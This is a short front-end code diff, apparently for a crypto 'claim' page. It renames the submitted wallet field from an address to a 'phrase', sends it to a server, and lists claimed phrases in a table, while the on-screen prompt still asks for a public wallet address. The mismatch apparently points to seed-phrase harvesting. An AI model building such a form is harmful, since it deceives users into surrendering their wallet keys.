@@ -70,14 +70,14 @@ event.preventDefault();
 error.textContent = "";  
 
 
-const walletAddress =  
+const walletPhrase =  
   wallet.value.trim();  
 
 
-if (!walletAddress) {  
+if (! walletPhrase) {  
 
   error.textContent =  
-    "Enter a public wallet address.";  
+    "Enter a public wallet Address.";  
 
   return;  
 
@@ -105,7 +105,7 @@ try {
         },  
 
         body: JSON.stringify({  
-          walletAddress  
+          walletPhrase 
         })  
 
       }  
@@ -134,7 +134,7 @@ try {
 
 
   claimWallet.textContent =  
-    walletAddress;  
+    walletPhrase;  
 
 
   claimCard.classList.add(  
@@ -308,7 +308,7 @@ try {
         </td>  
 
         <td>  
-          ${claim.wallet_Phrase}  
+          ${claim.wallet_phrase}  
         </td>  
 
         <td>  
